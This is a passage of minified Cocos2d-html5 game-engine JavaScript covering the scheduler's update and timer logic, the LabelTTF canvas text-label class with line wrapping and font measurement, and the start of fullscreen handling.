	setTimeScale: function(a) {
		this._timeScale = a
	},
	getTimeScale: function() {
		return this._timeScale
	},
	update: function(a) {
		var b = this._updates,
			c = this._arrayForTimers,
			d, e, f;
		this._updateHashLocked = !0;
		1 != this._timeScale && (a *= this._timeScale);
		e = 0;
		
		for (f = b.length; e < f && 0 <= e; e++) for (var g = this._updates[e], h = 0, k = g.length; h < k; h++) d = g[h], !d.paused && !d.markedForDeletion && d.target.update(a);
		e = 0;
		for (f = c.length; e < f; e++) {
			d = c[e];
			if (!d) break;
			this._currentTarget = d;
			this._currentTargetSalvaged = !1;
			if (!d.paused) for (d.timerIndex = 0; d.timerIndex < d.timers.length; d.timerIndex++) d.currentTimer = d.timers[d.timerIndex], d.currentTimerSalvaged = !1, d.currentTimer.update(a), d.currentTimer = null;
			this._currentTargetSalvaged && 0 == d.timers.length && (this._removeHashElement(d), e--)
		}
		e = 0;
		for (f = b.length; e < f; e++) {
			g = this._updates[e];
			h = 0;
			for (k = g.length; h < k;) {
				d = g[h];
				if (!d) break;
				d.markedForDeletion ? this._removeUpdateFromHash(d) : h++
			}
		}
		this._updateHashLocked = !1;
		this._currentTarget = null
	},
	scheduleCallbackForTarget: function(a, b, c, d, e, f) {
		cc.assert(b, cc._LogInfos.Scheduler_scheduleCallbackForTarget_2);
		cc.assert(a, cc._LogInfos.Scheduler_scheduleCallbackForTarget_3);
		c = c || 0;
		d = null == d ? cc.REPEAT_FOREVER : d;
		e = e || 0;
		f = f || !1;
		var g = this._hashForTimers[a.__instanceId];
		g || (g = new cc.HashTimerEntry(null, a, 0, null, null, f, null), this._arrayForTimers.push(g), this._hashForTimers[a.__instanceId] = g);
		if (null == g.timers) g.timers = [];
		else for (var h = 0; h < g.timers.length; h++) if (f = g.timers[h], b == f._callback) {
			cc.log(cc._LogInfos.Scheduler_scheduleCallbackForTarget, f.getInterval().toFixed(4), c.toFixed(4));
			f._interval = c;
			return
		}
		f = new cc.Timer(a, b, c, d, e);
		g.timers.push(f)
	},
	scheduleUpdateForTarget: function(a, b, c) {
		if (null !== a) {
			var d = this._updates,
				e = this._hashForUpdates[a.__instanceId];
			e ? e.entry.markedForDeletion = !1 : 0 == b ? this._appendIn(d[1], a, c) : 0 > b ? d[0] = this._priorityIn(d[0], a, b, c) : d[2] = this._priorityIn(d[2], a, b, c)
		}
	},
	unscheduleCallbackForTarget: function(a, b) {
		if (!(null == a || null == b)) {
			var c = this._hashForTimers[a.__instanceId];
			if (c) for (var d = c.timers, e = 0, f = d.length; e < f; e++) {
				var g = d[e];
				if (b == g._callback) {
					g == c.currentTimer && !c.currentTimerSalvaged && (c.currentTimerSalvaged = !0);
					d.splice(e, 1);
					c.timerIndex >= e && c.timerIndex--;
					0 == d.length && (this._currentTarget == c ? this._currentTargetSalvaged = !0 : this._removeHashElement(c));
					break
				}
			}
		}
	},
	unscheduleUpdateForTarget: function(a) {
		null != a && (a = this._hashForUpdates[a.__instanceId], null != a && (this._updateHashLocked ? a.entry.markedForDeletion = !0 : this._removeUpdateFromHash(a.entry)))
	},
	unscheduleAllCallbacksForTarget: function(a) {
		if (null != a) {
			var b = this._hashForTimers[a.__instanceId];
			if (b) {
				var c = b.timers;
				!b.currentTimerSalvaged && 0 <= c.indexOf(b.currentTimer) && (b.currentTimerSalvaged = !0);
				c.length = 0;
				this._currentTarget == b ? this._currentTargetSalvaged = !0 : this._removeHashElement(b)
			}
			this.unscheduleUpdateForTarget(a)
		}
	},
	unscheduleAllCallbacks: function() {
		this.unscheduleAllCallbacksWithMinPriority(cc.Scheduler.PRIORITY_SYSTEM)
	},
	unscheduleAllCallbacksWithMinPriority: function(a) {
		for (var b = this._arrayForTimers, c = this._updates, d = 0, e = b.length; d < e; d++) this.unscheduleAllCallbacksForTarget(b[d].target);
		for (d = 2; 0 <= d; d--) if (!(1 == d && 0 < a || 0 == d && 0 <= a)) for (var b = c[d], e = 0, f = b.length; e < f; e++) this.unscheduleUpdateForTarget(b[e].target)
	},
	pauseAllTargets: function() {
		return this.pauseAllTargetsWithMinPriority(cc.Scheduler.PRIORITY_SYSTEM)
	},
	pauseAllTargetsWithMinPriority: function(a) {
		a = [];
		for (var b, c = this._arrayForTimers, d = this._updates, e = 0, f = c.length; e < f; e++) if (b = c[e]) b.paused = !0, a.push(b.target);
		e = 0;
		for (f = d.length; e < f; e++) for (var c = d[e], g = 0, h = c.length; g < h; g++) if (b = c[g]) b.paused = !0, a.push(b.target);
		return a
	},
	resumeTargets: function(a) {
		if (a) for (var b = 0; b < a.length; b++) this.resumeTarget(a[b])
	},
	pauseTarget: function(a) {
		cc.assert(a, cc._LogInfos.Scheduler_pauseTarget);
		var b = this._hashForTimers[a.__instanceId];
		b && (b.paused = !0);
		if (a = this._hashForUpdates[a.__instanceId]) a.entry.paused = !0
	},
	resumeTarget: function(a) {
		cc.assert(a, cc._LogInfos.Scheduler_resumeTarget);
		var b = this._hashForTimers[a.__instanceId];
		b && (b.paused = !1);
		if (a = this._hashForUpdates[a.__instanceId]) a.entry.paused = !1
	},
	isTargetPaused: function(a) {
		cc.assert(a, cc._LogInfos.Scheduler_isTargetPaused);
		return (a = this._hashForTimers[a.__instanceId]) ? a.paused : !1
	}
});
cc.Scheduler.PRIORITY_SYSTEM = -2147483648;
cc._tmp.PrototypeLabelTTF = function() {
	var a = cc.LabelTTF.prototype;
	cc.defineGetterSetter(a, "color", a.getColor, a.setColor);
	cc.defineGetterSetter(a, "opacity", a.getOpacity, a.setOpacity);
	cc.defineGetterSetter(a, "string", a.getString, a.setString);
	cc.defineGetterSetter(a, "textAlign", a.getHorizontalAlignment, a.setHorizontalAlignment);
	cc.defineGetterSetter(a, "verticalAlign", a.getVerticalAlignment, a.setVerticalAlignment);
	cc.defineGetterSetter(a, "fontSize", a.getFontSize, a.setFontSize);
	cc.defineGetterSetter(a, "fontName", a.getFontName, a.setFontName);
	cc.defineGetterSetter(a, "font", a._getFont, a._setFont);
	cc.defineGetterSetter(a, "boundingWidth", a._getBoundingWidth, a._setBoundingWidth);
	cc.defineGetterSetter(a, "boundingHeight", a._getBoundingHeight, a._setBoundingHeight);
	cc.defineGetterSetter(a, "fillStyle", a._getFillStyle, a.setFontFillColor);
	cc.defineGetterSetter(a, "strokeStyle", a._getStrokeStyle, a._setStrokeStyle);
	cc.defineGetterSetter(a, "lineWidth", a._getLineWidth, a._setLineWidth);
	cc.defineGetterSetter(a, "shadowOffsetX", a._getShadowOffsetX, a._setShadowOffsetX);
	cc.defineGetterSetter(a, "shadowOffsetY", a._getShadowOffsetY, a._setShadowOffsetY);
	cc.defineGetterSetter(a, "shadowOpacity", a._getShadowOpacity, a._setShadowOpacity);
	cc.defineGetterSetter(a, "shadowBlur", a._getShadowBlur, a._setShadowBlur)
};
cc.LabelTTF = cc.Sprite.extend({
	_dimensions: null,
	_hAlignment: cc.TEXT_ALIGNMENT_CENTER,
	_vAlignment: cc.VERTICAL_TEXT_ALIGNMENT_TOP,
	_fontName: null,
	_fontSize: 0,
	_string: "",
	_originalText: null,
	_isMultiLine: !1,
	_fontStyleStr: null,
	_shadowEnabled: !1,
	_shadowOffset: null,
	_shadowOpacity: 0,
	_shadowBlur: 0,
	_shadowColorStr: null,
	_strokeEnabled: !1,
	_strokeColor: null,
	_strokeSize: 0,
	_strokeColorStr: null,
	_textFillColor: null,
	_fillColorStr: null,
	_strokeShadowOffsetX: 0,
	_strokeShadowOffsetY: 0,
	_needUpdateTexture: !1,
	_labelCanvas: null,
	_labelContext: null,
	_lineWidths: null,
	_className: "LabelTTF",
	ctor: function(a, b, c, d, e, f) {
		cc.Sprite.prototype.ctor.call(this);
		this._dimensions = cc.size(0, 0);
		this._hAlignment = cc.TEXT_ALIGNMENT_LEFT;
		this._vAlignment = cc.VERTICAL_TEXT_ALIGNMENT_TOP;
		this._opacityModifyRGB = !1;
		this._fontStyleStr = "";
		this._fontName = "Arial";
		this._shadowEnabled = this._isMultiLine = !1;
		this._shadowOffset = cc.p(0, 0);
		this._shadowBlur = this._shadowOpacity = 0;
		this._shadowColorStr = "rgba(128, 128, 128, 0.5)";
		this._strokeEnabled = !1;
		this._strokeColor = cc.color(255, 255, 255, 255);
		this._strokeSize = 0;
		this._strokeColorStr = "";
		this._textFillColor = cc.color(255, 255, 255, 255);
		this._fillColorStr = "rgba(255,255,255,1)";
		this._strokeShadowOffsetY = this._strokeShadowOffsetX = 0;
		this._needUpdateTexture = !1;
		this._lineWidths = [];
		this._setColorsString();
		b && b instanceof cc.FontDefinition ? this.initWithStringAndTextDefinition(a, b) : cc.LabelTTF.prototype.initWithString.call(this, a, b, c, d, e, f)
	},
	init: function() {
		return this.initWithString(" ", this._fontName, this._fontSize)
	},
	_measureConfig: function() {
		this._getLabelContext().font = this._fontStyleStr
	},
	_measure: function(a) {
		return this._getLabelContext().measureText(a).width
	},
	_checkNextline: function(a, b) {
		var c = this._measure(a),
			d = Math.floor(a.length * b / c),
			e = a.indexOf("\n");
		if (0.8 * d >= e && 0 < e) return e + 1;
		if (c < b) return a.length;
		for (var c = !1, f = b + 1, e = -1, g = d, h, k = cc.LabelTTF._checkRegEx, l = cc.LabelTTF._reverseCheckRegEx, m = cc.LabelTTF._checkEnRegEx, n = a.substr(d); h = k.exec(n);) {
			g += h[0].length;
			f = a.substr(0, g);
			f = this._measure(f);
			if ("\n" == h[2] && f < b) {
				c = !0;
				e = g;
				break
			}
			if (f > b) {
				-1 != e && (c = !0);
				break
			}
			e = g;
			n = a.substr(g)
		}
		if (c) return e;
		n = a.substr(0, d);
		for (e = d; h = l.exec(n);) if (e = h[1].length, n = h[1], f = this._measure(n), f < b) {
			m.test(h[2]) && e++;
			break
		}
		return e || 1
	},
	description: function() {
		return "\x3ccc.LabelTTF | FontName \x3d" + this._fontName + " FontSize \x3d " + this._fontSize.toFixed(1) + "\x3e"
	},
	setColor: null,
	_setColorsString: null,
	updateDisplayedColor: null,
	setOpacity: null,
	updateDisplayedOpacity: null,
	updateDisplayedOpacityForCanvas: function(a) {
		cc.NodeRGBA.prototype.updateDisplayedOpacity.call(this, a);
		this._setColorsString()
	},
	getString: function() {
		return this._string
	},
	getHorizontalAlignment: function() {
		return this._hAlignment
	},
	getVerticalAlignment: function() {
		return this._vAlignment
	},
	getDimensions: function() {
		return cc.size(this._dimensions.width, this._dimensions.height)
	},
	getFontSize: function() {
		return this._fontSize
	},
	getFontName: function() {
		return this._fontName
	},
	initWithString: function(a, b, c, d, e, f) {
		a = a ? a + "" : "";
		c = c || 16;
		d = d || cc.size(0, c);
		e = e || cc.TEXT_ALIGNMENT_LEFT;
		f = f || cc.VERTICAL_TEXT_ALIGNMENT_TOP;
		this._opacityModifyRGB = !1;
		this._dimensions = cc.size(d.width, d.height);
		this._fontName = b || "Arial";
		this._hAlignment = e;
		this._vAlignment = f;
		this._fontSize = c;
		this._fontStyleStr = this._fontSize + "px '" + b + "'";
		this._fontClientHeight = cc.LabelTTF.__getFontHeightByDiv(b, this._fontSize);
		this.string = a;
		this._setColorsString();
		this._updateTexture();
		this._needUpdateTexture = !1;
		return !0
	},
	initWithStringAndTextDefinition: null,
	setTextDefinition: function(a) {
		a && this._updateWithTextDefinition(a, !0)
	},
	getTextDefinition: function() {
		return this._prepareTextDefinition(!1)
	},
	enableShadow: function(a, b, c, d) {
		c = c || 0.5;
		!1 === this._shadowEnabled && (this._shadowEnabled = !0);
		var e = this._shadowOffset;
		if (e && e.x != a || e._y != b) e.x = a, e.y = b;
		this._shadowOpacity != c && (this._shadowOpacity = c);
		this._setColorsString();
		this._shadowBlur != d && (this._shadowBlur = d);
		this._needUpdateTexture = !0
	},
	_getShadowOffsetX: function() {
		return this._shadowOffset.x
	},
	_setShadowOffsetX: function(a) {
		!1 === this._shadowEnabled && (this._shadowEnabled = !0);
		this._shadowOffset.x != a && (this._shadowOffset.x = a, this._needUpdateTexture = !0)
	},
	_getShadowOffsetY: function() {
		return this._shadowOffset._y
	},
	_setShadowOffsetY: function(a) {
		!1 === this._shadowEnabled && (this._shadowEnabled = !0);
		this._shadowOffset._y != a && (this._shadowOffset._y = a, this._needUpdateTexture = !0)
	},
	_getShadowOffset: function() {
		return cc.p(this._shadowOffset.x, this._shadowOffset.y)
	},
	_setShadowOffset: function(a) {
		!1 === this._shadowEnabled && (this._shadowEnabled = !0);
		if (this._shadowOffset.x != a.x || this._shadowOffset.y != a.y) this._shadowOffset.x = a.x, this._shadowOffset.y = a.y, this._needUpdateTexture = !0
	},
	_getShadowOpacity: function() {
		return this._shadowOpacity
	},
	_setShadowOpacity: function(a) {
		!1 === this._shadowEnabled && (this._shadowEnabled = !0);
		this._shadowOpacity != a && (this._shadowOpacity = a, this._setColorsString(), this._needUpdateTexture = !0)
	},
	_getShadowBlur: function() {
		return this._shadowBlur
	},
	_setShadowBlur: function(a) {
		!1 === this._shadowEnabled && (this._shadowEnabled = !0);
		this._shadowBlur != a && (this._shadowBlur = a, this._needUpdateTexture = !0)
	},
	disableShadow: function() {
		this._shadowEnabled && (this._shadowEnabled = !1, this._needUpdateTexture = !0)
	},
	enableStroke: function(a, b) {
		!1 === this._strokeEnabled && (this._strokeEnabled = !0);
		var c = this._strokeColor;
		if (c.r !== a.r || c.g !== a.g || c.b !== a.b) c.r = a.r, c.g = a.g, c.b = a.b, this._setColorsString();
		this._strokeSize !== b && (this._strokeSize = b || 0);
		this._needUpdateTexture = !0
	},
	_getStrokeStyle: function() {
		return this._strokeColor
	},
	_setStrokeStyle: function(a) {
		!1 === this._strokeEnabled && (this._strokeEnabled = !0);
		var b = this._strokeColor;
		if (b.r !== a.r || b.g !== a.g || b.b !== a.b) b.r = a.r, b.g = a.g, b.b = a.b, this._setColorsString(), this._needUpdateTexture = !0
	},
	_getLineWidth: function() {
		return this._strokeSize
	},
	_setLineWidth: function(a) {
		!1 === this._strokeEnabled && (this._strokeEnabled = !0);
		this._strokeSize !== a && (this._strokeSize = a || 0, this._needUpdateTexture = !0)
	},
	disableStroke: function() {
		this._strokeEnabled && (this._strokeEnabled = !1, this._needUpdateTexture = !0)
	},
	setFontFillColor: null,
	_getFillStyle: function() {
		return this._textFillColor
	},
	_updateWithTextDefinition: function(a, b) {
		a.fontDimensions ? (this._dimensions.width = a.boundingWidth, this._dimensions.height = a.boundingHeight) : (this._dimensions.width = 0, this._dimensions.height = 0);
		this._hAlignment = a.textAlign;
		this._vAlignment = a.verticalAlign;
		this._fontName = a.fontName;
		this._fontSize = a.fontSize || 12;
		this._fontStyleStr = this._fontSize + "px '" + this._fontName + "'";
		this._fontClientHeight = cc.LabelTTF.__getFontHeightByDiv(this._fontName, this._fontSize);
		a.shadowEnabled && this.enableShadow(a.shadowOffsetX, a.shadowOffsetY, a.shadowOpacity, a.shadowBlur);
		a.strokeEnabled && this.enableStroke(a.strokeStyle, a.lineWidth);
		this.setFontFillColor(a.fillStyle);
		b && this._updateTexture()
	},
	_prepareTextDefinition: function(a) {
		var b = new cc.FontDefinition;
		a ? (b.fontSize = this._fontSize, b.boundingWidth = cc.contentScaleFactor() * this._dimensions.width, b.boundingHeight = cc.contentScaleFactor() * this._dimensions.height) : (b.fontSize = this._fontSize, b.boundingWidth = this._dimensions.width, b.boundingHeight = this._dimensions.height);
		b.fontName = this._fontName;
		b.textAlign = this._hAlignment;
		b.verticalAlign = this._vAlignment;
		if (this._strokeEnabled) {
			b.strokeEnabled = !0;
			var c = this._strokeColor;
			b.strokeStyle = cc.color(c.r, c.g, c.b);
			b.lineWidth = this._strokeSize
		} else b.strokeEnabled = !1;
		this._shadowEnabled ? (b.shadowEnabled = !0, b.shadowBlur = this._shadowBlur, b.shadowOpacity = this._shadowOpacity, b.shadowOffsetX = (a ? cc.contentScaleFactor() : 1) * this._shadowOffset.x, b.shadowOffsetY = (a ? cc.contentScaleFactor() : 1) * this._shadowOffset.y) : b._shadowEnabled = !1;
		a = this._textFillColor;
		b.fillStyle = cc.color(a.r, a.g, a.b);
		return b
	},
	_fontClientHeight: 18,
	setString: function(a) {
		a = String(a);
		this._originalText != a && (this._originalText = a + "", this._updateString(), this._needUpdateTexture = !0)
	},
	_updateString: function() {
		this._string = this._originalText
	},
	setHorizontalAlignment: function(a) {
		a !== this._hAlignment && (this._hAlignment = a, this._needUpdateTexture = !0)
	},
	setVerticalAlignment: function(a) {
		a != this._vAlignment && (this._vAlignment = a, this._needUpdateTexture = !0)
	},
	setDimensions: function(a) {
		if (a.width != this._dimensions.width || a.height != this._dimensions.height) this._dimensions = a, this._updateString(), this._needUpdateTexture = !0
	},
	_getBoundingWidth: function() {
		return this._dimensions.width
	},
	_setBoundingWidth: function(a) {
		a != this._dimensions.width && (this._dimensions.width = a, this._updateString(), this._needUpdateTexture = !0)
	},
	_getBoundingHeight: function() {
		return this._dimensions.height
	},
	_setBoundingHeight: function(a) {
		a != this._dimensions.height && (this._dimensions.height = a, this._updateString(), this._needUpdateTexture = !0)
	},
	setFontSize: function(a) {
		this._fontSize !== a && (this._fontSize = a, this._fontStyleStr = a + "px '" + this._fontName + "'", this._fontClientHeight = cc.LabelTTF.__getFontHeightByDiv(this._fontName, a), this._needUpdateTexture = !0)
	},
	setFontName: function(a) {
		this._fontName && this._fontName != a && (this._fontName = a, this._fontStyleStr = this._fontSize + "px '" + a + "'", this._fontClientHeight = cc.LabelTTF.__getFontHeightByDiv(a, this._fontSize), this._needUpdateTexture = !0)
	},
	_getFont: function() {
		return this._fontStyleStr
	},
	_setFont: function(a) {
		var b = cc.LabelTTF._fontStyleRE.exec(a);
		b && (this._fontSize = parseInt(b[1]), this._fontName = b[2], this._fontStyleStr = a, this._fontClientHeight = cc.LabelTTF.__getFontHeightByDiv(this._fontName, this._fontSize), this._needUpdateTexture = !0)
	},
	_drawTTFInCanvas: function(a) {
		if (a) {
			var b = this._strokeShadowOffsetX,
				c = this._strokeShadowOffsetY,
				d = this._contentSize.height - c,
				e = this._vAlignment,
				f = this._hAlignment,
				g = this._fontClientHeight,
				h = this._strokeSize;
			a.setTransform(1, 0, 0, 1, 0 + 0.5 * b, d + 0.5 * c);
			a.font != this._fontStyleStr && (a.font = this._fontStyleStr);
			a.fillStyle = this._fillColorStr;
			var k = c = 0,
				l = this._strokeEnabled;
			l && (a.lineWidth = 2 * h, a.strokeStyle = this._strokeColorStr);
			this._shadowEnabled && (h = this._shadowOffset, a.shadowColor = this._shadowColorStr, a.shadowOffsetX = h.x, a.shadowOffsetY = -h.y, a.shadowBlur = this._shadowBlur);
			a.textBaseline = cc.LabelTTF._textBaseline[e];
			a.textAlign = cc.LabelTTF._textAlign[f];
			b = this._contentSize.width - b;
			c = f === cc.TEXT_ALIGNMENT_RIGHT ? c + b : f === cc.TEXT_ALIGNMENT_CENTER ? c + b / 2 : c + 0;
			if (this._isMultiLine) {
				f = this._strings.length;
				e === cc.VERTICAL_TEXT_ALIGNMENT_BOTTOM ? k = g + d - g * f : e === cc.VERTICAL_TEXT_ALIGNMENT_CENTER && (k = g / 2 + (d - g * f) / 2);
				for (e = 0; e < f; e++) b = this._strings[e], h = -d + g * e + k, l && a.strokeText(b, c, h), a.fillText(b, c, h)
			} else e !== cc.VERTICAL_TEXT_ALIGNMENT_BOTTOM && (k = e === cc.VERTICAL_TEXT_ALIGNMENT_TOP ? k - d : k - 0.5 * d), l && a.strokeText(this._string, c, k), a.fillText(this._string, c, k)
		}
	},
	_getLabelContext: function() {
		if (this._labelContext) return this._labelContext;
		if (!this._labelCanvas) {
			var a = cc.newElement("canvas"),
				b = new cc.Texture2D;
			b.initWithElement(a);
			this.texture = b;
			this._labelCanvas = a
		}
		return this._labelContext = this._labelCanvas.getContext("2d")
	},
	_updateTTF: function() {
		var a = this._dimensions.width,
			b, c, d = this._lineWidths;
		d.length = 0;
		this._isMultiLine = !1;
		this._measureConfig();
		if (0 !== a) {
			var e = this._string;
			this._strings = [];
			b = 0;
			for (c = this._string.length; b < c;) {
				var f = this._checkNextline(e.substr(b), a),
					g = e.substr(b, f);
				this._strings.push(g);
				b += f
			}
		} else {
			this._strings = this._string.split("\n");
			b = 0;
			for (c = this._strings.length; b < c; b++) d.push(this._measure(this._strings[b]))
		}
		0 < this._strings.length && (this._isMultiLine = !0);
		c = b = 0;
		this._strokeEnabled && (b = c = 2 * this._strokeSize);
		this._shadowEnabled && (e = this._shadowOffset, b += 2 * Math.abs(e.x), c += 2 * Math.abs(e.y));
		a = 0 === a ? this._isMultiLine ? cc.size(0 | Math.max.apply(Math, d) + b, 0 | this._fontClientHeight * this._strings.length + c) : cc.size(0 | this._measure(this._string) + b, 0 | this._fontClientHeight + c) : 0 === this._dimensions.height ? this._isMultiLine ? cc.size(0 | a + b, 0 | this._fontClientHeight * this._strings.length + c) : cc.size(0 | a + b, 0 | this._fontClientHeight + c) : cc.size(0 | a + b, 0 | this._dimensions.height + c);
		this.setContentSize(a);
		this._strokeShadowOffsetX = b;
		this._strokeShadowOffsetY = c;
		d = this._anchorPoint;
		this._anchorPointInPoints.x = 0.5 * b + (a.width - b) * d.x;
		this._anchorPointInPoints.y = 0.5 * c + (a.height - c) * d.y
	},
	getContentSize: function() {
		this._needUpdateTexture && this._updateTTF();
		return cc.Sprite.prototype.getContentSize.call(this)
	},
	_getWidth: function() {
		this._needUpdateTexture && this._updateTTF();
		return cc.Sprite.prototype._getWidth.call(this)
	},
	_getHeight: function() {
		this._needUpdateTexture && this._updateTTF();
		return cc.Sprite.prototype._getHeight.call(this)
	},
	_updateTexture: function() {
		var a = this._getLabelContext(),
			b = this._labelCanvas,
			c = this._contentSize;
		if (0 === this._string.length) return b.width = 1, b.height = c.height, this.setTextureRect(cc.rect(0, 0, 1, c.height)), !0;
		a.font = this._fontStyleStr;
		this._updateTTF();
		var d = c.width,
			c = c.height,
			e = b.width == d && b.height == c;
		b.width = d;
		b.height = c;
		e && a.clearRect(0, 0, d, c);
		this._drawTTFInCanvas(a);
		this._texture && this._texture.handleLoadedTexture();
		this.setTextureRect(cc.rect(0, 0, d, c));
		return !0
	},
	visit: function(a) {
		this._string && "" != this._string && (this._needUpdateTexture && (this._needUpdateTexture = !1, this._updateTexture()), cc.Sprite.prototype.visit.call(this, a || cc._renderContext))
	},
	draw: null,
	_setTextureCoords: function(a) {
		var b = this._batchNode ? this.textureAtlas.texture : this._texture;
		if (b) {
			var c = b.pixelsWidth,
				d = b.pixelsHeight,
				e, f = this._quad;
			this._rectRotated ? (cc.FIX_ARTIFACTS_BY_STRECHING_TEXEL ? (b = (2 * a.x + 1) / (2 * c), c = b + (2 * a.height - 2) / (2 * c), e = (2 * a.y + 1) / (2 * d), a = e + (2 * a.width - 2) / (2 * d)) : (b = a.x / c, c = (a.x + a.height) / c, e = a.y / d, a = (a.y + a.width) / d), this._flippedX && (d = e, e = a, a = d), this._flippedY && (d = b, b = c, c = d), f.bl.texCoords.u = b, f.bl.texCoords.v = e, f.br.texCoords.u = b, f.br.texCoords.v = a, f.tl.texCoords.u = c, f.tl.texCoords.v = e, f.tr.texCoords.u = c, f.tr.texCoords.v = a) : (cc.FIX_ARTIFACTS_BY_STRECHING_TEXEL ? (b = (2 * a.x + 1) / (2 * c), c = b + (2 * a.width - 2) / (2 * c), e = (2 * a.y + 1) / (2 * d), a = e + (2 * a.height - 2) / (2 * d)) : (b = a.x / c, c = (a.x + a.width) / c, e = a.y / d, a = (a.y + a.height) / d), this._flippedX && (d = b, b = c, c = d), this._flippedY && (d = e, e = a, a = d), f.bl.texCoords.u = b, f.bl.texCoords.v = a, f.br.texCoords.u = c, f.br.texCoords.v = a, f.tl.texCoords.u = b, f.tl.texCoords.v = e, f.tr.texCoords.u = c, f.tr.texCoords.v = e);
			this._quadDirty = !0
		}
	}
});
cc._renderType === cc._RENDER_TYPE_CANVAS ? (_p = cc.LabelTTF.prototype, _p.setColor = function(a) {
	cc.NodeRGBA.prototype.setColor.call(this, a);
	this._setColorsString()
}, _p._setColorsString = function() {
	this._needUpdateTexture = !0;
	var a = this._displayedColor,
		b = this._displayedOpacity,
		c = this._strokeColor,
		d = this._textFillColor;
	this._shadowColorStr = "rgba(" + (0 | 0.5 * a.r) + "," + (0 | 0.5 * a.g) + "," + (0 | 0.5 * a.b) + "," + this._shadowOpacity + ")";
	this._fillColorStr = "rgba(" + (0 | a.r / 255 * d.r) + "," + (0 | a.g / 255 * d.g) + "," + (0 | a.b / 255 * d.b) + ", " + b / 255 + ")";
	this._strokeColorStr = "rgba(" + (0 | a.r / 255 * c.r) + "," + (0 | a.g / 255 * c.g) + "," + (0 | a.b / 255 * c.b) + ", " + b / 255 + ")"
}, _p.updateDisplayedColor = function(a) {
	cc.NodeRGBA.prototype.updateDisplayedColor.call(this, a);
	this._setColorsString()
}, _p.setOpacity = function(a) {
	this._opacity !== a && (cc.Sprite.prototype.setOpacity.call(this, a), this._setColorsString(), this._needUpdateTexture = !0)
}, _p.updateDisplayedOpacity = cc.Sprite.prototype.updateDisplayedOpacity, _p.initWithStringAndTextDefinition = function(a, b) {
	this._updateWithTextDefinition(b, !1);
	this.string = a;
	return !0
}, _p.setFontFillColor = function(a) {
	var b = this._textFillColor;
	if (b.r != a.r || b.g != a.g || b.b != a.b) b.r = a.r, b.g = a.g, b.b = a.b, this._setColorsString(), this._needUpdateTexture = !0
}, _p.draw = cc.Sprite.prototype.draw, _p.setTextureRect = function(a, b, c) {
	this._rectRotated = b || !1;
	this.setContentSize(c || a);
	this.setVertexRect(a);
	b = this._textureRect_Canvas;
	b.x = a.x;
	b.y = a.y;
	b.width = a.width;
	b.height = a.height;
	b.validRect = !(0 === b.width || 0 === b.height || 0 > b.x || 0 > b.y);
	a = this._unflippedOffsetPositionFromCenter;
	this._flippedX && (a.x = -a.x);
	this._flippedY && (a.y = -a.y);
	this._offsetPosition.x = a.x + (this._contentSize.width - this._rect.width) / 2;
	this._offsetPosition.y = a.y + (this._contentSize.height - this._rect.height) / 2;
	this._batchNode && (this.dirty = !0)
}, _p = null) : (cc.assert("function" === typeof cc._tmp.WebGLLabelTTF, cc._LogInfos.MissingFile, "LabelTTFWebGL.js"), cc._tmp.WebGLLabelTTF(), delete cc._tmp.WebGLLabelTTF);
cc.assert("function" === typeof cc._tmp.PrototypeLabelTTF, cc._LogInfos.MissingFile, "LabelTTFPropertyDefine.js");
cc._tmp.PrototypeLabelTTF();
delete cc._tmp.PrototypeLabelTTF;
cc.LabelTTF._textAlign = ["left", "center", "right"];
cc.LabelTTF._textBaseline = ["top", "middle", "bottom"];
cc.LabelTTF._checkRegEx = /(.+?)([\s\n\r\-\/\\\:]|[一-龥]|[︰-ﾠ])/;
cc.LabelTTF._reverseCheckRegEx = /(.*)([\s\n\r\-\/\\\:]|[一-龥]|[︰-ﾠ])/;
cc.LabelTTF._checkEnRegEx = /[\s\-\/\\\:]/;
cc.LabelTTF._fontStyleRE = /^(\d+)px\s+['"]?([\w\s\d]+)['"]?$/;
cc.LabelTTF.create = function(a, b, c, d, e, f) {
	return new cc.LabelTTF(a, b, c, d, e, f)
};
cc.LabelTTF._SHADER_PROGRAM = cc.USE_LA88_LABELS ? cc.SHADER_POSITION_TEXTURECOLOR : cc.SHADER_POSITION_TEXTUREA8COLOR;
cc.LabelTTF.__labelHeightDiv = cc.newElement("div");
cc.LabelTTF.__labelHeightDiv.style.fontFamily = "Arial";
cc.LabelTTF.__labelHeightDiv.style.position = "absolute";
cc.LabelTTF.__labelHeightDiv.style.left = "-100px";
cc.LabelTTF.__labelHeightDiv.style.top = "-100px";
cc.LabelTTF.__labelHeightDiv.style.lineHeight = "normal";
document.body ? document.body.appendChild(cc.LabelTTF.__labelHeightDiv) : cc._addEventListener(window, "load", function() {
	this.removeEventListener("load", arguments.callee, !1);
	document.body.appendChild(cc.LabelTTF.__labelHeightDiv)
}, !1);
cc.LabelTTF.__getFontHeightByDiv = function(a, b) {
	var c = cc.LabelTTF.__fontHeightCache[a + "." + b];
	if (0 < c) return c;
	var d = cc.LabelTTF.__labelHeightDiv;
	d.innerHTML = "ajghl~!";
	d.style.fontFamily = a;
	d.style.fontSize = b + "px";
	c = d.clientHeight;
	cc.LabelTTF.__fontHeightCache[a + "." + b] = c;
	d.innerHTML = "";
	return c
};
cc.LabelTTF.__fontHeightCache = {};
cc.screen = {
	_supportsFullScreen: !1,
	_preOnFullScreenChange: null,
	_touchEvent: "",
	_fn: null,
	_fnMap: [
		["requestFullscreen", "exitFullscreen", "fullscreenchange", "fullscreenEnabled", "fullscreenElement"],
		["requestFullScreen", "exitFullScreen", "fullScreenchange", "fullScreenEnabled", "fullScreenElement"],
		["webkitRequestFullScreen", "webkitCancelFullScreen", "webkitfullscreenchange", "webkitIsFullScreen", "webkitCurrentFullScreenElement"],
		["mozRequestFullScreen", "mozCancelFullScreen", "mozfullscreenchange", "mozFullScreen", "mozFullScreenElement"],
		["msRequestFullscreen", "msExitFullscreen", "MSFullscreenChange", "msFullscreenEnabled", "msFullscreenElement"]
	],
	init: function() {
		this._fn = {};
		var a, b, d, c = this._fnMap;
		for (a = 0, l = c.length; l > a; a++) if (b = c[a], b && b[1] in document) {
			for (a = 0, d = b.length; d > a; a++) this._fn[c[0][a]] = b[a];
			break
		}
		this._supportsFullScreen = void 0 != this._fn.requestFullscreen, this._touchEvent = "ontouchstart" in window ? "touchstart" : "mousedown"
	},
	fullScreen: function() {
		return this._supportsFullScreen && document[this._fn.fullscreenEnabled]
	},
	requestFullScreen: function(a, b) {
		if (this._supportsFullScreen) {
			if (a = a || document.documentElement, a[this._fn.requestFullscreen](), b) {
				var c = this._fn.fullscreenchange;
				this._preOnFullScreenChange && document.removeEventListener(c, this._preOnFullScreenChange), this._preOnFullScreenChange = b, cc._addEventListener(document, c, b, !1)
			}
			return a[this._fn.requestFullscreen]()
		}
	},
